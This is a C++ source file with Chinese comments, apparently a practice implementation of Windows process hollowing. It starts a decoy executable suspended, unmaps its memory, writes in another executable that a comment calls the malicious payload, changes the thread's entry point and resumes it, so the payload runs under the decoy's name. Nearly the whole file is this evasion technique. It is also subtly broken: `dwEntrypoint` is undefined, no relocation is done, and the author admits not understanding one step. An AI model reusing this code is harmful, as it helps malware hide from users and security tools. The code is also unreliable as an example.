#include <iostream>
#include <windows.h>
#include <string.h>
#include "PE.h"
using namespace std;

void CreateHollowedProcess(char *HollowedProcess, char *pSourceFile);
int main()
{
	char* pPath = new char[MAX_PATH];
	GetModuleFileName(0, pPath, MAX_PATH);
	pPath[strrchr(pPath, '\\') - pPath + 1] = 0;
	strcat(pPath, "Real.exe");	// 拼接得到启动器当前目录下的目标PE文件('helloworld.exe')
	cout << pPath << endl;
	char TProcess[] = "Fake.exe";
	CreateHollowedProcess(TProcess,pPath);	// 创建外壳进程 svchost下面运行的其实是 helloworld这个进程
	system("pause");
	return 0;
}

void CreateHollowedProcess(char *HollowedProcess, char *pSourceFile)
{
	cout << HollowedProcess << endl;

	// 挂起状态创建进程
	// 指定窗口工作站，桌面，标准句柄以及创建时进程主窗口的外观的结构体
	LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();	//用于指定新进程的主窗口特性的一个结构
	LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();	//该结构返回有关新进程及其主线程的信息
	CreateProcessA
	(
		0,
		HollowedProcess,
		0,
		0,
		0,
		CREATE_SUSPENDED,	// 以挂起状态创建进程
		0,
		0,
		pStartupInfo,
		pProcessInfo	// 句柄信息 pProcessInfo->hProcess
	);

	if (!pProcessInfo->hProcess)
	{
		cout << "Process creation failed" << endl;
		return;
	}
	cout << pProcessInfo->dwProcessId << endl;

	// gather information(image base) from PEB
	PPEB pPEB = ReadRemotePEB(pProcessInfo->hProcess);	// 声明在PE.cpp里
	cout << "Image base address of PEB"<<pPEB->ImageBaseAddress<< endl;
	

	// carving out process to create hollow
	// 秽土转生 把外部导入的API变成能用的
	FARPROC fpNtUnmapViewOfSection = GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection");	// 最主要的 hollow进程的函数
	_NtUnmapViewOfSection NtUnmapViewOfSection =
		(_NtUnmapViewOfSection)fpNtUnmapViewOfSection;

	DWORD dwResult = NtUnmapViewOfSection(pProcessInfo->hProcess, pPEB->ImageBaseAddress);	//目标进程，carving起始地址（直接imagebase开始）
	if (dwResult)
	{
		cout << "carving error!" << endl;
		return;
	}


	//打开恶意荷载
	HANDLE hFile = CreateFile
	(
		pSourceFile,
		GENERIC_READ,
		0,
		0,
		OPEN_ALWAYS,
		0,
		0
	);
	if (!hFile)
	{
		cout << "can not open file" << endl;
		return;
	}

	// 读取文件的data到bBuffer(包括计算文件大小，开辟buffer)
	DWORD dwSize = GetFileSize(hFile, 0);
	PBYTE pBuffer = new BYTE[dwSize];	//开辟空间
	DWORD dwBytesRead = 0;
	ReadFile(hFile, pBuffer, dwSize, &dwBytesRead, 0);	//读取PE文件的data到pBuffer
	PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD)pBuffer);	//获取PE文件映像空间
	PIMAGE_NT_HEADERS32 pSourceHeaders = GetNTHeaders((DWORD)pBuffer);	//获取PE NT头

	// Alloc Memory
	LPVOID AllocMemory =VirtualAllocEx
	(
		pProcessInfo->hProcess,
		pPEB->ImageBaseAddress,
		pSourceHeaders->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	if (!AllocMemory)
	{
		cout << "Alloc memory error" << endl;
		return;
	}

	pSourceHeaders->OptionalHeader.ImageBase = (DWORD)pPEB->ImageBaseAddress;	//这条我没懂

	// Write Process Memory
	if (WriteProcessMemory(pProcessInfo->hProcess, AllocMemory, pBuffer, pSourceHeaders->OptionalHeader.SizeOfHeaders, NULL))	//写入文件头 SizeOfHeaders
		cout << "Write memory successful" << endl;
	else
	{
		cout << "Write memory error" << endl;
		return;
	}

	for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)	// 写入各节区
	{
		if (!pSourceImage->Sections[x].PointerToRawData)
			continue;

		PVOID pSectionDestination =
			(PVOID)((DWORD)pPEB->ImageBaseAddress + pSourceImage->Sections[x].VirtualAddress);

		printf("Writing %s section to 0x%p\r\n", pSourceImage->Sections[x].Name, pSectionDestination);

		if (!WriteProcessMemory
		(
			pProcessInfo->hProcess,
			pSectionDestination,
			&pBuffer[pSourceImage->Sections[x].PointerToRawData],
			pSourceImage->Sections[x].SizeOfRawData,
			0
		))
		{
			printf("Error writing process memory\r\n");
			return;
		}
	}

	//每个线程内核对象都维护着一个CONTEXT结构，里面保存了线程运行的状态，
	//使得CPU可以记得上次运行该线程运行到哪里了，该从哪里开始运行。
	LPCONTEXT pContext = new CONTEXT();
	pContext->ContextFlags = CONTEXT_INTEGER;

	printf("Getting thread context\r\n");

	if (!GetThreadContext(pProcessInfo->hThread, pContext))
	{
		printf("Error getting context\r\n");
		return;
	}

	pContext->Eax = dwEntrypoint;	//32位模式下的eax寄存器，保存的值为程序的入口点地址，即镜像加载基址+镜像内偏移		
	//pContext->Rcx = dwEntryPoint;	//64模式下Rcx寄存器, 保存程序的EntryPoint
	printf("Setting thread context\r\n");

	//设置上下文，恢复线程。
	if (!SetThreadContext(pProcessInfo->hThread, pContext))
	{
		printf("Error setting context\r\n");
		return;
	}

	printf("Resuming thread\r\n");

	if (!ResumeThread(pProcessInfo->hThread))	// 唤醒进程
	{
		printf("Error resuming thread\r\n");
		return;
	}

	printf("Process hollowing complete\r\n");
}
